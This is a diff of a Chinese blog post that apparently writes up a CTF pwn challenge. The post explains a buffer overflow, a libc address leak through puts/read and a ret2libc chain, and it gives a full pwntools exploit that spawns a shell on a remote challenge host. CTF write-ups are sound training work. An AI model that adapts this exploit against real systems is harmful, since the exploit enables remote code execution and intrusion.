@@ -387,14 +387,14 @@ IDA6">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-01-17
+                    2025-01-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    398
+                    595
                 </div>
                 
 
@@ -432,19 +432,15 @@ IDA6">
 <p>需要构造两个payload，而且要先pop四次，payload1=’a’*0x18+p64(pop_4)+p64(ROP);</p>
 <p>![屏幕截图 2025-01-16 162420](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 162420.png)</p>
 <p>通过泄露puts和read真实地址寻找libc版本，脚本如下：</p>
-<p>from pwn import *</p>
-<p>context(os = ‘linux’, arch = ‘amd64’, log_level = ‘debug’)</p>
-<p>r = remote(‘61.147.171.105’,63071)<br>elf = ELF(‘./7eff’)<br>libc = ELF(‘./libc6_2.23-0ubuntu11_amd64.so’)</p>
-<p>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘read’]<br>main_addr = elf.symbols[‘main’]</p>
-<p>pop_rdi_ret = 0x4008a3<br>pop_4 = 0x40089c</p>
-<p>payload = b’a’ * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</p>
-<p>r.sendlineafter(‘RCTF\n’,payload)</p>
-<p>puts_real_addr = u64(r.recvuntil(‘\x7f’)[-6:].ljust(8, b’\x00’))</p>
-<p>print(“puts_real_addr:”,hex(puts_real_addr))</p>
-<p>libc_base = puts_real_addr - libc.symbols[‘read’]<br>print(hex(libc_base))<br>system_addr = libc_base + libc.symbols[‘system’]<br>binsh_addr = libc_base + next(libc.search(‘/bin/sh’))</p>
-<p>payload1 = b’a’ * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)</p>
-<p>r.sendline(payload1)</p>
-<p>r.interactive()</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os = 'linux', arch = 'amd64', log_level = 'debug')</span><br><span class="line"></span><br><span class="line">r = remote('61.147.171.105',63071)</span><br><span class="line">elf = ELF('./7eff')</span><br><span class="line">libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">puts_got = elf.got['read']</span><br><span class="line">main_addr = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4008a3</span><br><span class="line">pop_4 = 0x40089c</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter('RCTF\n',payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span><br><span class="line"></span><br><span class="line">print("puts_real_addr:",hex(puts_real_addr))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>把read改为puts，就可以得到puts的真实地址。read和puts的真实地址是变化的，但后三位是不变的，根据其可以筛选出libc版本，并将其下载。</p>
+<p>![屏幕截图 2025-01-16 170856](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 170856.png)我们可以通过puts真实地址-偏移得到libc的基地址，从而可以计算出system和/bin/sh,进而构造payload2 = b’a’ * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)</p>
+<p>最终的exp：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context(os = 'linux', arch = 'amd64', log_level = 'debug')</span><br><span class="line"></span><br><span class="line">r = remote('61.147.171.105',63071)</span><br><span class="line">elf = ELF('./7eff')</span><br><span class="line">libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">puts_got = elf.got['read']</span><br><span class="line">main_addr = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4008a3</span><br><span class="line">pop_4 = 0x40089c</span><br><span class="line">#ret = 0x400589</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter('RCTF\n',payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span><br><span class="line"></span><br><span class="line">print("puts_real_addr:",hex(puts_real_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_real_addr - libc.symbols['read']</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols['system']</span><br><span class="line">binsh_addr = libc_base + next(libc.search('/bin/sh'))</span><br><span class="line"></span><br><span class="line">payload1 = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+
+
 
                 
             </div>
